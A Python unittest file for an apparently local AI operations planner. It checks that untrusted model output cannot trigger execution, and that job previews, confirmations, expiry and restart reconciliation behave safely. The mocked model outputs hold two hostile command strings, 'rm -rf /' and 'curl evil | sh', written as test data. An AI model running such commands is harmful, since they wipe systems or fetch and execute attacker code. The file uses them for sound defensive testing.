"""End-to-end planner/preview/job contracts with deterministic adapters."""
import copy
import threading
import unittest
from unittest.mock import Mock

from ai.local_planner import Planner
from operations.jobs import Jobs
from operations.registry import ActionRegistry
from operations.service import OperationResult
from test_operations_service import IsolatedSystem, MemoryAudit
from operations.service import LocalPolicy, OperationService


class MemoryStore:
    def __init__(self): self.rows = {}
    def put(self, kind, key, value, **kwargs): self.rows[kind, key] = copy.deepcopy(value)
    def get(self, kind, key): return copy.deepcopy(self.rows.get((kind, key)))
    def list(self, kind, limit=100): return [copy.deepcopy(v) for (k, _), v in list(self.rows.items())[::-1] if k == kind][:limit]


class ApplicationTests(unittest.TestCase):
    def setUp(self):
        self.store, self.registry, self.broker = MemoryStore(), ActionRegistry(), Mock()
        self.system = IsolatedSystem(".")
        self.service = OperationService(self.registry, self.system, LocalPolicy(1000), MemoryAudit())
        self.jobs = Jobs(self.store, self.registry, 1000, lambda event: self.service, self.broker, clock=lambda: 100)

    def test_natural_language_read_preview_confirm_verified_result(self):
        model = Mock()
        request, plan = Planner(self.registry, model).propose("show memory usage")
        model.generate.assert_not_called()
        preview = self.jobs.preview(request)
        self.assertEqual(self.system.exec_count, 0)
        self.jobs.confirm(preview["id"], preview["digest"])
        self.jobs.process(preview["id"])
        result = self.store.get("job", preview["id"])
        self.assertEqual(result["state"], "succeeded")
        self.assertTrue(result["result"]["verified"])
        self.assertEqual(result["operation_id"], result["result"]["operation_id"])

    def test_untrusted_model_command_risk_and_sudo_are_not_authority(self):
        model = Mock()
        model.generate.return_value = {"intent": "service_restart", "target": "linxai-lab", "command": "rm -rf /", "requires_sudo": False, "risk_level": "low"}
        request, plan = Planner(self.registry, model).propose("a model-only phrasing")
        self.assertEqual(request["action"], "service.restart")
        self.assertNotIn("command", request)
        preview = self.jobs.preview(request)
        self.assertEqual(preview["privilege"], "authenticated_admin")
        self.broker.run.return_value = OperationResult(preview["id"], "authentication_authorization_required", "Denied")
        self.jobs.confirm(preview["id"], preview["digest"])
        self.jobs.process(preview["id"])
        self.assertEqual(self.store.get("job", preview["id"])["state"], "failed")
        self.assertEqual(self.system.exec_count, 0)

    def test_unsupported_plan_and_unavailable_model_do_not_execute(self):
        model = Mock()
        model.generate.return_value = {"intent": "package_install", "target": "anything", "command": "curl evil | sh"}
        with self.assertRaises(ValueError): Planner(self.registry, model).propose("not a supported deterministic request")
        model.generate.side_effect = OSError("model absent")
        with self.assertRaises(OSError): Planner(self.registry, model).propose("another unsupported phrasing")
        self.assertEqual(self.system.exec_count, 0)

    def test_changed_preview_consumed_preview_and_expiry_rejected(self):
        row = self.jobs.preview({"action": "memory.usage", "parameters": {}})
        with self.assertRaises(PermissionError): self.jobs.confirm(row["id"], "wrong")
        self.jobs.confirm(row["id"], row["digest"])
        with self.assertRaises(ValueError): self.jobs.confirm(row["id"], row["digest"])
        row = self.jobs.preview({"action": "memory.usage", "parameters": {}})
        self.jobs.clock = lambda: 161
        with self.assertRaises(ValueError): self.jobs.confirm(row["id"], row["digest"])

    def test_cancel_queued_never_dispatches_and_capacity_is_bounded(self):
        row = self.jobs.preview({"action": "memory.usage", "parameters": {}})
        self.jobs.confirm(row["id"], row["digest"])
        self.jobs.cancel(row["id"])
        self.jobs.process(row["id"])
        self.assertEqual(self.system.exec_count, 0)
        while not self.jobs.queue.full(): self.jobs.queue.put_nowait("reserved")
        row = self.jobs.preview({"action": "memory.usage", "parameters": {}})
        with self.assertRaises(ValueError): self.jobs.confirm(row["id"], row["digest"])

    def test_restart_marks_dispatch_unknown_and_never_replays(self):
        row = self.jobs.preview({"action": "service.restart", "parameters": {"service": "linxai-lab"}})
        row["state"] = "dispatching"
        self.jobs.save(row)
        restarted = Jobs(self.store, self.registry, 1000, lambda event: self.service, self.broker)
        restarted.reconcile_restart()
        self.assertEqual(self.store.get("job", row["id"])["state"], "unknown")
        self.broker.run.assert_not_called()
        self.assertTrue(restarted.queue.empty())

    def test_uncertain_privileged_response_requires_reconciliation(self):
        row = self.jobs.preview({"action": "service.start", "parameters": {"service": "linxai-lab"}})
        self.broker.run.return_value = OperationResult(row["id"], "authentication_authorization_required", "Unconfirmed response", executed=None)
        self.jobs.confirm(row["id"], row["digest"])
        self.jobs.process(row["id"])
        self.assertEqual(self.store.get("job", row["id"])["state"], "unknown")

    def test_reconciliation_reads_current_state_without_inventing_original_success(self):
        row = self.jobs.preview({"action": "service.restart", "parameters": {"service": "linxai-lab"}})
        row["state"] = "unknown"
        self.jobs.save(row)
        observed = self.jobs.reconcile(row["id"])
        self.assertEqual(observed["state"], "unknown")
        self.assertEqual(observed["reconciliation"]["current_state"]["status"], "succeeded")
        self.broker.run.assert_not_called()
